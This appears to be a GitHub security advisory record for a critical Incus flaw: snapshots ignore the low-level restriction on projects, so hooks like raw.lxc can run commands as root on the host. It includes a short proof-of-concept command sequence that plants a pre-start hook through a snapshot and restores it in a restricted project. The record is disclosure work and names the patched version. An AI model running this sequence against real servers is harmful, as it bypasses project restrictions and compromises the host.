"name": "Missing Authorization"}], "description": "### Summary

Instance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.


### Details

Instance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`.

As snapshots can be moved from one server to another, a malicious instance+snapshot can be crafted locally, moved to a restricted project and the snapshot restored for arbitrary command execution.

In practice, this allows a malicious actor to execute arbitrary commands on the host with root privileges.


### PoC

```
# remote, restricted
incus project set rem:project restricted.true
incus project set rem:project restricted.containers.lowlevel=block

# locally, unrestricted project
incus init images:debian/trixie rce-raw-lxc
incus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c "/bin/id >/lxc-hook-prestart"'
incus snapshot create rce-raw-lxc snap0
#> allow transfer to restricted project
incus config unset rce-raw-lxc raw.lxc

# locally, transfer and trigger
incus move rce-raw-lxc rem: --mode push
incus snapshot restore rem:rce-raw-lxc snap0
incus start rem:rce-raw-lxc
```


### Impact

- Bypass of project restrictions.
- Arbitrary command execution on the Incus server.", "ghsa_id": "GHSA-48q5-w887-33wv", "github_reviewed_at": "2026-06-26T18:33:55Z", "html_url": "https://github.com/advisories/GHSA-48q5-w887-33wv", "identifiers": [{"type": "GHSA", "value": "GHSA-48q5-w887-33wv"}, {"type": "CVE", "value": "CVE-2026-48751"}], "nvd_published_at": null, "published_at": "2026-06-26T18:33:55Z", "references": ["https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv", "https://github.com/advisories/GHSA-48q5-w887-33wv"], "repository_advisory_url": "https://api.github.com/repos/lxc/incus/security-advisories/GHSA-48q5-w887-33wv", "severity": "critical", "source_code_location": "https://github.com/lxc/incus", "summary": "Incus has a restricted project bypass leading to arbitrary command execution", "type": "reviewed", "updated_at": "2026-06-26T18:33:56Z", "url": "https://api.github.com/advisories/GHSA-48q5-w887-33wv", "vulnerabilities": [{"first_patched_version": "7.2.0", "package": {"ecosystem": "go", "name": "github.com/lxc/incus/v7/cmd/incusd"}, "vulnerable_functions": [], "vulnerable_version_range": "< 7.2.0"}], "withdrawn_at": null}

title: Incus has a restricted project bypass leading to arbitrary command execution
